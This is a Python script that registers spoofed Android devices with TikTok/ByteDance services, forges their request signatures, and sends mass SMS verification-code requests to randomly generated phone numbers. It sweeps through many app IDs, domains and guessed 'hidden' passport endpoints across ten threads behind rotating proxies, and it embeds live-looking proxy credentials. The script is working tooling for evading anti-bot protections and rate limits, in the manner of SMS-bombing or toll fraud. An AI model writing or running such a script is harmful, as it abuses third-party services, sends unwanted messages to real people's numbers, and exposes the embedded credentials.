"""
Test new AIDs (3569, 3559 Volcengine), new domains (verify.zijieapi.com, open.snssdk.com),
and new endpoint (/passport/open/send_code/) across all apps.
"""
import requests, random, time, json, hashlib, uuid, urllib3
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

urllib3.disable_warnings()
from SignerPy import sign as sp_sign, xor

PROXY_TEMPLATE = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080'

# New domains to test
NEW_DOMAINS = [
    # User-requested domains
    "verify.zijieapi.com",
    "open.snssdk.com",
    # snssdk.com subdomains (from netify.ai scan)
    "i.snssdk.com",
    "is.snssdk.com",
    "ib.snssdk.com",
    "lf.snssdk.com",
    "aweme.snssdk.com",
    "frontier.snssdk.com",
    "is-hl.snssdk.com",
    "is-lq.snssdk.com",
    "i-hl.snssdk.com",
    "i-lq.snssdk.com",
    # zijieapi.com subdomains (from netify.ai scan)
    "api.zijieapi.com",
    "open.zijieapi.com",
    "passport.zijieapi.com",
    "ads3-normal-lf.zijieapi.com",
    "ads3-normal.zijieapi.com",
]

# Known working mobile domains for comparison
MOBILE_DOMAINS = [
    "api16-normal-c-useast2a.tiktokv.com",
    "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api-t2.tiktokv.com",
    "api2-16-h2.musical.ly",
    "api3-normal-c-lf.amemv.com",
    "api.amemv.com",
]

WEB_DOMAINS = ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"]

# Endpoints to test
ENDPOINTS = [
    "/passport/mobile/send_code/v1/",   # Known working
    "/passport/open/send_code/",         # NEW - user requested
    "/passport/web/send_code/",          # Known web endpoint
    "/passport/mobile/send_code/",       # Without v1
    "/passport/mobile/send_code/v2/",    # v2 variation
    "/passport/app/send_code/",          # Variation
    "/passport/sms/send_code/",          # Variation
    "/passport/email/send_code/",        # Email variation
    "/passport/token/send_code/",        # Token variation
    "/passport/auth/send_code/",         # Auth variation
]

# AIDs to test
ALL_APPS = [
    # NEW Volcengine AIDs
    {"aid": 3569, "app_name": "volcengine", "name": "Volcengine 3569", "signed": True},
    {"aid": 3559, "app_name": "volcengine", "name": "Volcengine 3559", "signed": True},
    # Also try with musical_ly app_name
    {"aid": 3569, "app_name": "musical_ly", "name": "Volc 3569 (mly)", "signed": True},
    {"aid": 3559, "app_name": "musical_ly", "name": "Volc 3559 (mly)", "signed": True},
    # Known success apps for domain testing
    {"aid": 1128, "app_name": "aweme", "name": "Douyin", "signed": True},
    {"aid": 1233, "app_name": "musical_ly", "name": "TikTok Global", "signed": True},
    {"aid": 1340, "app_name": "trill", "name": "TikTok Lite", "signed": True},
    {"aid": 3006, "app_name": "vicut", "name": "CapCut", "signed": True},
    {"aid": 2658, "app_name": "musical_ly", "name": "BD 2658", "signed": True},
    {"aid": 7743, "app_name": "musical_ly", "name": "BD 7743", "signed": True},
    {"aid": 1319, "app_name": "super", "name": "Pipix", "signed": True},
    {"aid": 13, "app_name": "news_article", "name": "Toutiao", "signed": True},
    {"aid": 1180, "app_name": "musical_ly", "name": "Helo", "signed": True},
    {"aid": 1988, "app_name": "douyin_web", "name": "Douyin Web", "signed": False},
    {"aid": 1583, "app_name": "tiktok_web", "name": "TikTok Ads", "signed": False},
    {"aid": 1459, "app_name": "tiktok_web", "name": "TikTok Web", "signed": False},
]

TC = [3532, 3635, 3637, 3634]
REGIONS = ["AU", "DE", "SG", "FR"]

lock = threading.Lock()
results = {"success": [], "rate_limited": [], "ec16": [], "other": [], "tested": 0}

def get_phone(region):
    pools = {"AU": ["+614"], "DE": ["+4915"], "SG": ["+658"], "FR": ["+336"],
             "US": ["+1202"], "GB": ["+4477"]}
    prefix = random.choice(pools.get(region, ["+44770"]))
    return prefix + str(random.randint(1000000, 9999999))

def register_device(aid, app_name, proxy, domain="api3-normal-c-lf.amemv.com"):
    brands = [("Samsung","SM-G991B","13","33"), ("Google","Pixel 7","14","34")]
    b, m, av, api = random.choice(brands)
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4()); ts = int(time.time())
    params = {"aid": str(aid), "app_name": app_name, "version_code": "350804",
              "version_name": "35.8.4", "device_platform": "android", "os": "android",
              "os_api": api, "os_version": av, "device_type": m, "device_brand": b,
              "language": "en", "ac": "wifi", "channel": "googleplay",
              "resolution": "1080*2400", "dpi": "420", "openudid": openudid,
              "cdid": cdid, "ts": str(ts), "_rticket": str(ts*1000)}
    body = json.dumps({"magic_tag": "ss_app_log", "header": {
        "display_name": f"App_{aid}", "update_version_code": 350804, "manifest_version_code": 350804,
        "aid": aid, "channel": "googleplay", "package": "com.zhiliaoapp.musically",
        "app_version": "35.8.4", "version_code": 350804, "sdk_version": "2.14.0-rc.8",
        "os": "Android", "os_version": av, "os_api": int(api), "device_model": m,
        "device_brand": b, "device_manufacturer": b, "cpu_abi": "arm64-v8a",
        "release_build": "f66b21c_20241009", "density_dpi": 420,
        "display_density": "xxhdpi", "resolution": "1080x2400", "language": "en",
        "timezone": 1, "access": "wifi", "cdid": cdid, "sig_hash": "aea615ab",
        "openudid": openudid, "clientudid": str(uuid.uuid4()), "region": "US"}, "_gen_ts": ts})
    url = f"https://{domain}/service/2/device_register/?{urlencode(params)}"
    ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android {av}; en_US; {m}; Build/TQ3A.230901.001)"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers={"Host": domain, "User-Agent": ua,
                   "Content-Type": "application/json"}, verify=False, timeout=12)
        if r.status_code == 200:
            d = r.json()
            if "device_id" in d and d["device_id"]:
                return {"device_id": str(d["device_id"]), "iid": str(d["install_id"]),
                        "brand": b, "model": m, "av": av, "api": api, "openudid": openudid,
                        "cdid": cdid, "ua": ua,
                        "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
                        "csrf": ''.join(random.choices('0123456789abcdef', k=32))}
    except: pass
    finally: s.close()
    return None

def send_signed(domain, app, phone, tc, proxy, dev, endpoint):
    encrypted = xor(phone)
    ts = int(time.time()); rticket = str(ts * 1000 + random.randint(1000, 9999))
    common = {"passport-sdk-version": "50559", "iid": dev["iid"], "device_id": dev["device_id"],
              "ac": "wifi", "channel": "googleplay", "aid": str(app["aid"]),
              "app_name": app["app_name"], "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "ssmix": "a",
              "device_type": dev["model"], "device_brand": dev["brand"], "language": "en",
              "os_api": dev["api"], "os_version": dev["av"],
              "manifest_version_code": "350804", "resolution": "1080*2400", "dpi": "420",
              "update_version_code": "350804", "cdid": dev["cdid"], "carrier_region": "US"}
    url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(ts)
    body_p = dict(common)
    body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
                   "mix_mode": "1", "mobile": encrypted, "type": str(tc), "_rticket": rticket, "ts": str(ts)})
    url_str = urlencode(url_p); body = urlencode(body_p)
    cookies = f"odin_tt={dev['odin_tt']}; install_id={dev['iid']}; passport_csrf_token_default={dev['csrf']}"
    try:
        sigs = sp_sign(params=url_str, payload=body, cookie=cookies, version=8404, aid=app["aid"])
    except: return None
    headers = {"Host": domain, "Cookie": cookies, "X-SS-REQ-TICKET": rticket,
               "sdk-version": "2", "passport-sdk-version": "50559",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "X-SS-DP": str(app["aid"]), "User-Agent": dev["ua"],
               "X-Gorgon": sigs.get("x-gorgon",""), "X-Khronos": sigs.get("x-khronos",str(ts)),
               "X-Argus": sigs.get("x-argus",""), "X-Ladon": sigs.get("x-ladon",""),
               "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper())}
    url = f"https://{domain}{endpoint}?{url_str}"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": (d.get("data",{}).get("description","") or "")[:80] if isinstance(d.get("data"),dict) else "",
                "raw": json.dumps(d)[:150]}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:80], "raw": ""}
    finally: s.close()

def send_web(domain, app, phone, tc, proxy, endpoint):
    encrypted = ''.join(format(ord(c) ^ 5, '02x') for c in phone)
    body = urlencode({"mobile": encrypted, "type": str(tc), "aid": str(app["aid"]),
                      "app_name": app["app_name"], "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0"})
    url = f"https://{domain}{endpoint}?aid={app['aid']}&app_name={app['app_name']}"
    headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
               "Origin": f"https://{domain}", "Referer": f"https://{domain}/", "X-SS-DP": str(app["aid"])}
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": (d.get("data",{}).get("description","") or "")[:80] if isinstance(d.get("data"),dict) else "",
                "raw": json.dumps(d)[:150]}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:80], "raw": ""}
    finally: s.close()

def run_test(domain, app, tc, region, endpoint):
    proxy = PROXY_TEMPLATE.format(region=region)
    phone = get_phone(region)
    r = None
    if app["signed"]:
        dev = register_device(app["aid"], app["app_name"], proxy)
        if dev:
            r = send_signed(domain, app, phone, tc, proxy, dev, endpoint)
    else:
        r = send_web(domain, app, phone, tc, proxy, endpoint)
    
    with lock:
        results["tested"] += 1
        if r:
            entry = {"domain": domain, "app": app["name"], "aid": app["aid"], "tc": tc,
                     "region": region, "endpoint": endpoint, "phone": phone,
                     "msg": r["msg"], "ec": r["ec"], "status": r["status"], "desc": r["desc"]}
            if r["msg"] == "success":
                results["success"].append(entry)
                print(f"\n  *** SUCCESS *** {app['name']:20} AID={app['aid']} domain={domain} ep={endpoint} tc={tc} reg={region}")
            elif r["ec"] == 7 or r["ec"] == 1206:
                results["rate_limited"].append(entry)
            elif r["ec"] == 16:
                results["ec16"].append(entry)
            else:
                results["other"].append(entry)
                if r["status"] != -1 and "Maximum number" not in str(r.get("desc","")):
                    print(f"\n  ?? {app['name']:15} AID={app['aid']} ep={endpoint[:30]} dom={domain[:30]} ec={r['ec']} s={r['status']} msg={r['msg']!r} desc={r['desc'][:50]!r}")
        if results["tested"] % 100 == 0:
            s = len(results["success"]); rl = len(results["rate_limited"])
            print(f"\r  [{results['tested']} done] S:{s} RL:{rl} ec16:{len(results['ec16'])} err:{len(results['other'])}     ", end="", flush=True)

def main():
    tasks = []
    
    # PHASE 1: Volcengine AIDs (3569, 3559) on ALL domains × ALL endpoints
    print("=== PHASE 1: Volcengine AIDs on all domains ===")
    volc_apps = ALL_APPS[:4]
    for app in volc_apps:
        for domain in NEW_DOMAINS + MOBILE_DOMAINS + WEB_DOMAINS:
            for ep in ENDPOINTS:
                tc = random.choice(TC)
                region = random.choice(REGIONS)
                tasks.append((domain, app, tc, region, ep))
    
    # PHASE 2: New domains (zijieapi, snssdk) on ALL known apps
    print("=== PHASE 2: New domains on all known apps ===")
    for app in ALL_APPS[4:]:
        for domain in NEW_DOMAINS:
            for ep in ["/passport/mobile/send_code/v1/", "/passport/open/send_code/", "/passport/web/send_code/"]:
                tc = random.choice(TC)
                region = random.choice(REGIONS)
                tasks.append((domain, app, tc, region, ep))
    
    # PHASE 3: /passport/open/send_code/ on ALL apps × working domains
    print("=== PHASE 3: open/send_code endpoint on all apps ===")
    for app in ALL_APPS[4:]:
        for domain in MOBILE_DOMAINS + WEB_DOMAINS:
            tc = random.choice(TC)
            region = random.choice(REGIONS)
            tasks.append((domain, app, tc, region, "/passport/open/send_code/"))
    
    # PHASE 4: Hidden endpoints on working domains
    print("=== PHASE 4: Hidden endpoints on working domains ===")
    for app in ALL_APPS[4:9]:
        for domain in MOBILE_DOMAINS[:3]:
            for ep in ["/passport/mobile/send_code/", "/passport/app/send_code/", "/passport/sms/send_code/"]:
                tc = random.choice(TC)
                region = random.choice(REGIONS)
                tasks.append((domain, app, tc, region, ep))
    
    random.shuffle(tasks)
    print(f"\nTotal tasks: {len(tasks)} | Apps: {len(ALL_APPS)} | Domains: {len(NEW_DOMAINS)+len(MOBILE_DOMAINS)+len(WEB_DOMAINS)} | Endpoints: {len(ENDPOINTS)}")
    print("="*70)
    
    start = time.time()
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(run_test, d, a, t, reg, ep) for d, a, t, reg, ep in tasks]
        try:
            for f in as_completed(futures): f.result()
        except KeyboardInterrupt: print("\nInterrupted!")
    
    elapsed = time.time() - start
    print(f"\n\n{'='*70}")
    print(f"COMPLETE: {results['tested']} tests in {elapsed:.0f}s ({results['tested']/max(elapsed,1):.1f} req/s)")
    
    print(f"\n*** SUCCESSES ({len(results['success'])}) ***")
    for s in results["success"]: print(f"  {s}")
    
    print(f"\n** RATE LIMITED ({len(results['rate_limited'])}) **")
    rl_groups = {}
    for r in results["rate_limited"]:
        k = f"{r['app']} (AID={r['aid']}) ep={r['endpoint']}"
        if k not in rl_groups: rl_groups[k] = {"domains": set(), "regions": set(), "tcs": set()}
        rl_groups[k]["domains"].add(r["domain"]); rl_groups[k]["regions"].add(r["region"]); rl_groups[k]["tcs"].add(r["tc"])
    for app, info in sorted(rl_groups.items()):
        print(f"  {app}: {len(info['domains'])} domains, regions={info['regions']}")
    
    print(f"\n** ec=16 ({len(results['ec16'])}) **")
    ec16_groups = set(f"{r['app']} (AID={r['aid']}) ep={r['endpoint']}" for r in results["ec16"])
    for a in sorted(ec16_groups): print(f"  {a}")
    
    print(f"\n** Other ({len(results['other'])}) **")
    other_groups = {}
    for r in results["other"]:
        k = f"ec={r['ec']} s={r['status']}"
        if k not in other_groups: other_groups[k] = 0
        other_groups[k] += 1
    for k, c in sorted(other_groups.items()): print(f"  {k}: {c} times")
    
    with open("/home/ubuntu/volcengine_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nSaved to /home/ubuntu/volcengine_results.json")

if __name__ == "__main__":
    main()
